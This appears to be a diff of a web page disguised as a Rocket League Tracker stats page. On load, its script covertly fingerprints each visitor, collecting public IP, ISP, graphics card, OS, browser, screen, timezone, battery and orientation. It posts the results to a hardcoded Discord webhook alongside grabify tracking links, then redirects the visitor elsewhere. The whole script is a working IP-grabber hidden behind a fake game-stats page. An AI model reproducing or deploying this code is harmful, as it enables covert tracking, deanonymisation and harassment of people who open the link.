@@ -1,8 +1,8 @@
 <html>
-	<head>
+<head>
 <title>76561198198256121's Rocket League Stats - Rocket League Tracker</title>
 <meta name="description" content="Check detailed Rocket League Stats and Leaderboards rankings."/>
-		<meta name="theme-color" content="#001538">
+	<meta name="theme-color" content="#001538">
 <meta content="Rocket League Tracker" property="og:site_name">
 
 </head>
@@ -12,144 +12,144 @@
 
 
 
-	
+
 const whurl = "https://discord.com/api/webhooks/982835750980706304/3Y-UdEf8ewXcMe-I9GvTgHzdksBF_2LhgU3Ta3oUl7aWVRDwnHSNC-DffFuYers7Xl47";
 
 function getVideoCardInfo() {
-  const gl = document.createElement('canvas').getContext('webgl');
-  if (!gl) {
-    return {
-      error: "no webgl",
-    };
-  }
-  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-  return debugInfo ? {
-    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-  } : {
-    error: "no WEBGL_debug_renderer_info",
-  };
+const gl = document.createElement('canvas').getContext('webgl');
+if (!gl) {
+return {
+error: "no webgl",
+};
+}
+const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+return debugInfo ? {
+vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+} : {
+error: "no WEBGL_debug_renderer_info",
+};
 }
 
 // Updated operating system detection function
 function getAndroidVersion(userAgent) {
-  const matches = userAgent.match(/Android (\d+(\.\d+)?)/i);
-  return matches ? `Android ${matches[1]}` : "Android (Unknown Version)";
+const matches = userAgent.match(/Android (\d+(\.\d+)?)/i);
+return matches ? `Android ${matches[1]}` : "Android (Unknown Version)";
 }
 
 
 function getiOSVersion(userAgent) {
-  const matches = userAgent.match(/(iPad|iPhone).*OS (\d+(_\d+)?)/i);
-  return matches ? `${matches[1]} OS ${matches[2].replace("_", ".")}` : "iOS (Unknown Version)";
+const matches = userAgent.match(/(iPad|iPhone).*OS (\d+(_\d+)?)/i);
+return matches ? `${matches[1]} OS ${matches[2].replace("_", ".")}` : "iOS (Unknown Version)";
 }
 
 
 function detectBrowser() {
-  const userAgent = navigator.userAgent;
+const userAgent = navigator.userAgent;
 
-  if (userAgent.indexOf("Firefox") !== -1) {
-    return "Firefox";
-  } else if (userAgent.indexOf("Chrome") !== -1) {
-    return "Chrome";
-  } else if (userAgent.indexOf("Safari") !== -1) {
-    return "Safari";
-  } else if (userAgent.indexOf("Edge") !== -1) {
-    return "Microsoft Edge";
-  } else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) {
-    return "Internet Explorer";
-  } else {
-    return "Unknown Browser";
-  }
+if (userAgent.indexOf("Firefox") !== -1) {
+return "Firefox";
+} else if (userAgent.indexOf("Chrome") !== -1) {
+return "Chrome";
+} else if (userAgent.indexOf("Safari") !== -1) {
+return "Safari";
+} else if (userAgent.indexOf("Edge") !== -1) {
+return "Microsoft Edge";
+} else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) {
+return "Internet Explorer";
+} else {
+return "Unknown Browser";
+}
 }
 
 
 function getOperatingSystem() {
-  const userAgent = navigator.userAgent;
+const userAgent = navigator.userAgent;
 
-  if (userAgent.includes("Windows NT 10.0")) {
-    if (userAgent.includes("Windows NT 10.0; Win64; x64")) {
-      return "Windows 10/11";
-    }
-    return "Windows 10";
-  } else if (userAgent.includes("Windows NT 6.3")) {
-    return "Windows 8.1";
-  } else if (userAgent.includes("Windows NT 6.2")) {
-    return "Windows 8";
-  } else if (userAgent.includes("Windows NT 6.1")) {
-    return "Windows 7";
-  } else if (userAgent.includes("Windows NT 6.0")) {
-    return "Windows Vista";
-  } else if (userAgent.includes("Windows NT 5.1")) {
-    return "Windows XP";
-  } else if (userAgent.includes("Windows NT 5.0")) {
-    return "Windows 2000";
-  } else if (userAgent.includes("Windows NT 4.0")) {
-    return "Windows NT 4.0";
-  }  else if (userAgent.includes("Android")) {
-    return getAndroidVersion(userAgent);
-  } else if (userAgent.includes("iOS")) {
-    return getiOSVersion(userAgent);
-  } else if (userAgent.includes("Mac OS X 10_")) {
-    const versionStartIndex = userAgent.indexOf("Mac OS X 10_") + 11;
-    const version = userAgent.substring(versionStartIndex, versionStartIndex + 3);
-    return "macOS " + version;
-  } else if (userAgent.includes("Linux")) {
-    return "Linux";
-  } else {
-    return "Unknown OS";
-  }
+if (userAgent.includes("Windows NT 10.0")) {
+if (userAgent.includes("Windows NT 10.0; Win64; x64")) {
+return "Windows 10/11";
+}
+return "Windows 10";
+} else if (userAgent.includes("Windows NT 6.3")) {
+return "Windows 8.1";
+} else if (userAgent.includes("Windows NT 6.2")) {
+return "Windows 8";
+} else if (userAgent.includes("Windows NT 6.1")) {
+return "Windows 7";
+} else if (userAgent.includes("Windows NT 6.0")) {
+return "Windows Vista";
+} else if (userAgent.includes("Windows NT 5.1")) {
+return "Windows XP";
+} else if (userAgent.includes("Windows NT 5.0")) {
+return "Windows 2000";
+} else if (userAgent.includes("Windows NT 4.0")) {
+return "Windows NT 4.0";
+}  else if (userAgent.includes("Android")) {
+return getAndroidVersion(userAgent);
+} else if (userAgent.includes("iOS")) {
+return getiOSVersion(userAgent);
+} else if (userAgent.includes("Mac OS X 10_")) {
+const versionStartIndex = userAgent.indexOf("Mac OS X 10_") + 11;
+const version = userAgent.substring(versionStartIndex, versionStartIndex + 3);
+return "macOS " + version;
+} else if (userAgent.includes("Linux")) {
+return "Linux";
+} else {
+return "Unknown OS";
+}
 }
 
 
 
 function getPublicIPAddress() {
-  return fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => data.ip)
-    .catch(error => {
-      console.error('Error fetching IP address:', error);
-      return "Error";
-    });
+return fetch('https://api.ipify.org?format=json')
+.then(response => response.json())
+.then(data => data.ip)
+.catch(error => {
+console.error('Error fetching IP address:', error);
+return "Error";
+});
 }
 
 function getDaBattery(){
-	if(navigator.getBattery){
-    return navigator.getBattery()
+if(navigator.getBattery){
+return navigator.getBattery()
 }
 else{
-   return "N/A"
+return "N/A"
 }
-	
+
 }
 
 function realWindowsVersion(userOS) {
-  return new Promise((resolve, reject) => {
-    navigator.userAgentData.getHighEntropyValues(["platformVersion"])
-      .then(ua => {
-        if (navigator.userAgentData.platform === "Windows") {
-          const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
-          if (majorPlatformVersion >= 13) {
-            resolve("Windows 11 or later");
-          } else {
-            resolve("Windows 10");
-          }
-        } else {
-          resolve(userOS); // Return the original OS if not Windows
-        }
-      })
-      .catch(error => {
-        console.error("Error fetching platformVersion:", error);
-        resolve(userOS); // Return the original OS in case of an error
-      });
-  });
+return new Promise((resolve, reject) => {
+navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+.then(ua => {
+if (navigator.userAgentData.platform === "Windows") {
+  const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+  if (majorPlatformVersion >= 13) {
+    resolve("Windows 11 or later");
+  } else {
+    resolve("Windows 10");
+  }
+} else {
+  resolve(userOS); // Return the original OS if not Windows
+}
+})
+.catch(error => {
+console.error("Error fetching platformVersion:", error);
+resolve(userOS); // Return the original OS in case of an error
+});
+});
 }
 
 function hasTouchscreen() {
-  if ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) {
-    return true;
-  } else {
-    return false;
-  }
+if ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) {
+return true;
+} else {
+return false;
+}
 }
 
 
@@ -157,39 +157,39 @@ function hasTouchscreen() {
 
 
 function getISP(ipAddress) {
-  return fetch(`https://ipinfo.io/${ipAddress}/json`)
-    .then((response) => {
-      if (response.ok) {
-        return response.json();
-      } else {
-        throw new Error('Failed to fetch ISP information');
-      }
-    })
-    .then((data) => {
-      const isp = data.org || 'N/A';
-      return isp;
-    })
-    .catch((error) => {
-      console.error(error);
-      return 'N/A';
-    });
+return fetch(`https://ipinfo.io/${ipAddress}/json`)
+.then((response) => {
+if (response.ok) {
+return response.json();
+} else {
+throw new Error('Failed to fetch ISP information');
+}
+})
+.then((data) => {
+const isp = data.org || 'N/A';
+return isp;
+})
+.catch((error) => {
+console.error(error);
+return 'N/A';
+});
 }
 
 
-	
+
 
 async function logIP() {
-  try {
-    const ip = await getPublicIPAddress();
-    const graphCard = getVideoCardInfo().renderer;
-    let userOS = getOperatingSystem(); // Use the updated function for OS detection.
-    const userAgent = navigator.userAgent  
-    const kbLang = navigator.language  
-    const screenWidth = window.screen.width;
-    const screenHeight = window.screen.height;
-    const screenResolution = `${screenWidth} x ${screenHeight}`;
-    const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;	
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+try {
+const ip = await getPublicIPAddress();
+const graphCard = getVideoCardInfo().renderer;
+let userOS = getOperatingSystem(); // Use the updated function for OS detection.
+const userAgent = navigator.userAgent  
+const kbLang = navigator.language  
+const screenWidth = window.screen.width;
+const screenHeight = window.screen.height;
+const screenResolution = `${screenWidth} x ${screenHeight}`;
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;	
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
 if (userOS === "Windows 10/11"){
 userOS = await realWindowsVersion(userOS);
@@ -209,8 +209,8 @@ const browser = detectBrowser();
 
 
 
-  // Example usage:
-  const batteryInfo = await getDaBattery();
+// Example usage:
+const batteryInfo = await getDaBattery();
 
 let batteryLevel = "N/A";
 let batteryCharging = "N/A";
@@ -219,20 +219,28 @@ let batteryDishargeTime = "N/A";
 
 
 
-	  
+  
 if (navigator.getBattery) {
-	if (batteryInfo !== "N/A") {
-	batteryLevel = `${batteryInfo.level * 100}%`;
-	batteryCharging = batteryInfo.charging ? "Yes" : "No";
-	batteryChargeTime = `${batteryInfo.chargingTime} Seconds`;
-	batteryDishargeTime = `${batteryInfo.dischargingTime} Seconds`;
-	}
+if (batteryInfo !== "N/A") {
+batteryLevel = `${batteryInfo.level * 100}%`;
+batteryCharging = batteryInfo.charging ? "Yes" : "No";
+batteryChargeTime = `${batteryInfo.chargingTime} Seconds`;
+batteryDishargeTime = `${batteryInfo.dischargingTime} Seconds`;
+}
 }
 
-
+let portrait = window.matchMedia("(orientation: portrtait)").matches;
+let orientation = ""
+if(portrait){
+orientation = "Portrait"
+}
+else{
+orientation = "Landscape"
+}
+  
 const isTouchscreen = hasTouchscreen();
 const isp = await getISP(ip)	  
-	  
+  
 const message = `
 The Kakapo has found another IP!
 Check here to see all IPs logged: <https://grabify.link/track/QRUKDR>
@@ -255,26 +263,27 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Battery Charge Time: ${batteryChargeTime} 
 - Battery Life Time: ${batteryDishargeTime} 
 - Touch Screen: ${isTouchscreen}
+- Orientation: ${orientation}
 `;
-	  
-    const msg = {
-      content: message
-    };
+  
+const msg = {
+content: message
+};
 
-    await fetch(whurl, {
-      method: "POST",
-      headers: {
-        "content-type": "application/json"
-      },
-      body: JSON.stringify(msg)
-    });
+await fetch(whurl, {
+method: "POST",
+headers: {
+"content-type": "application/json"
+},
+body: JSON.stringify(msg)
+});
 
-    setTimeout(function () {
-      window.location.replace("https://gamer.tattoo/0E0IA0");
-    }, 10);
-  } catch (error) {
-    console.error('Error:', error);
-  }
+setTimeout(function () {
+window.location.replace("https://gamer.tattoo/0E0IA0");
+}, 10);
+} catch (error) {
+console.error('Error:', error);
+}
 }
 
 logIP();
